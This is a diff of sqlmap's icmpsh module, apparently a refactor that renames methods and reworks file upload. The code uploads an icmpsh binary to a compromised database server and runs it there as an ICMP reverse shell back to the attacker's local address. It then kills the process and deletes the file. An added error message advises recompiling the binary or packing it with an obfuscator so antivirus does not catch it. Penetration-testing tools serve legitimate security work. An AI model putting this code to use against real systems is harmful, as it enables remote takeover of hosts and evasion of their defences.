@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
@@ -19,77 +19,87 @@ from lib.core.data import conf
 from lib.core.data import logger
 from lib.core.data import paths
 
-
 class ICMPsh:
     """
     This class defines methods to call icmpsh for plugins.
     """
 
-    def __initVars(self):
+    def _initVars(self):
         self.lhostStr = None
         self.rhostStr = None
         self.localIP = getLocalIP()
         self.remoteIP = getRemoteIP()
-        self.__icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe"))
+        self._icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe_"))
 
-    def __selectRhost(self):
-        message = "which is the back-end DBMS address? [%s] " % self.remoteIP
+    def _selectRhost(self):
+        message = "what is the back-end DBMS address? [%s] " % self.remoteIP
         address = readInput(message, default=self.remoteIP)
 
         return address
 
-    def __selectLhost(self):
-        message = "which is the local address? [%s] " % self.localIP
+    def _selectLhost(self):
+        message = "what is the local address? [%s] " % self.localIP
         address = readInput(message, default=self.localIP)
 
         return address
 
-    def __prepareIngredients(self, encode=True):
-        self.lhostStr = self.__selectLhost()
-        self.rhostStr = self.__selectRhost()
+    def _prepareIngredients(self, encode=True):
+        self.lhostStr = ICMPsh._selectLhost(self)
+        self.rhostStr = ICMPsh._selectRhost(self)
 
-    def __runIcmpshMaster(self):
+    def _runIcmpshMaster(self):
         infoMsg = "running icmpsh master locally"
         logger.info(infoMsg)
 
         icmpshmaster(self.lhostStr, self.rhostStr)
 
-    def __runIcmpshSlaveRemote(self):
+    def _runIcmpshSlaveRemote(self):
         infoMsg = "running icmpsh slave remotely"
         logger.info(infoMsg)
 
-        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self.__icmpslaveRemote, self.lhostStr)
+        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self._icmpslaveRemote, self.lhostStr)
 
         self.execCmd(cmd, silent=True)
 
     def uploadIcmpshSlave(self, web=False):
-        self.__initVars()
-        self.__randStr = randomStr(lowercase=True)
-        self.__icmpslaveRemoteBase = "tmpi%s.exe" % self.__randStr
+        ICMPsh._initVars(self)
+        self._randStr = randomStr(lowercase=True)
+        self._icmpslaveRemoteBase = "tmpi%s.exe" % self._randStr
+
+        self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)
+        self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))
+
+        logger.info("uploading icmpsh slave to '%s'" % self._icmpslaveRemote)
 
         if web:
-            self.__icmpslaveRemote = "%s/%s" % (self.webDirectory, self.__icmpslaveRemoteBase)
+            written = self.webUpload(self._icmpslaveRemote, os.path.split(self._icmpslaveRemote)[0], filepath=self._icmpslave)
         else:
-            self.__icmpslaveRemote = "%s/%s" % (conf.tmpPath, self.__icmpslaveRemoteBase)
+            written = self.writeFile(self._icmpslave, self._icmpslaveRemote, "binary", forceCheck=True)
 
-        self.__icmpslaveRemote = ntToPosixSlashes(normalizePath(self.__icmpslaveRemote))
+        if written is not True:
+            errMsg = "there has been a problem uploading icmpsh, it "
+            errMsg += "looks like the binary file has not been written "
+            errMsg += "on the database underlying file system or an AV has "
+            errMsg += "flagged it as malicious and removed it. In such a case "
+            errMsg += "it is recommended to recompile icmpsh with slight "
+            errMsg += "modification to the source code or pack it with an "
+            errMsg += "obfuscator software"
+            logger.error(errMsg)
 
-        logger.info("uploading icmpsh slave to '%s'" % self.__icmpslaveRemote)
-
-        if web:
-            self.webFileUpload(self.__icmpslave, self.__icmpslaveRemote, self.webDirectory)
+            return False
         else:
-            self.writeFile(self.__icmpslave, self.__icmpslaveRemote, "binary")
+            logger.info("icmpsh successfully uploaded")
+            return True
 
     def icmpPwn(self):
-        self.__prepareIngredients()
-        self.__runIcmpshSlaveRemote()
-        self.__runIcmpshMaster()
+        ICMPsh._prepareIngredients(self)
+        self._runIcmpshSlaveRemote()
+        self._runIcmpshMaster()
 
         debugMsg = "icmpsh master exited"
         logger.debug(debugMsg)
 
         time.sleep(1)
-        self.execCmd("taskkill /F /IM %s" % self.__icmpslaveRemoteBase, silent=True)
+        self.execCmd("taskkill /F /IM %s" % self._icmpslaveRemoteBase, silent=True)
         time.sleep(1)
-        self.delRemoteFile(self.__icmpslaveRemote)
+        self.delRemoteFile(self._icmpslaveRemote)
